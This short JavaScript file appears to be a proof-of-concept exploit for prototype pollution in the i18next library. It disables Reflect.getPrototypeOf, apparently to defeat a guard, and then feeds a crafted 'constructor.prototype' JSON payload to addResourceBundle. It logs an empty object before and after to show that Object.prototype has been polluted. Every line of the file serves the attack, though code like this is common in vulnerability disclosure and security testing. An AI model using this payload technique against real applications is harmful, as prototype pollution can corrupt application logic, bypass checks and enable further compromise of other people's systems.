Reflect.getPrototypeOf = () => false;
const i18next = require('i18next');
const translations = '{"constructor": {"prototype": {"polluted":"yes"}}}';
const existingData = {};
i18next.init({
    lng: 'en',
    resources: {}
});
console.log({}.polluted);
i18next.addResourceBundle('en', 'translation', JSON.parse(translations), true, true);
console.log({}.polluted);